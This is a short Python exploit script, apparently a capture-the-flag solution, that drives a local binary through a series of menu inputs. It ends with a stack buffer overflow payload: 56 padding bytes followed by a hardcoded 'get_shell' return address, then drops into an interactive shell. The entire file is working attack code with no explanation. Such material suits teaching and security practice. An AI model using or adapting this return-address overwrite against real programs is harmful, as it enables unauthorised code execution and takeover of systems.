import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

get_shell = '\x21\x0b\x40\x00\x00\x00\x00\x00'
p = interact.Process()


p.sendline('31')
p.sendline('A' * 100)
p.sendline('y')
p.sendline('test')
p.sendline('B' * 100)
p.sendline('y')
p.sendline('test')
p.sendline('test')
p.sendline('y')
p.sendline('A' * 56 + get_shell + 'G' * 40)

p.interactive()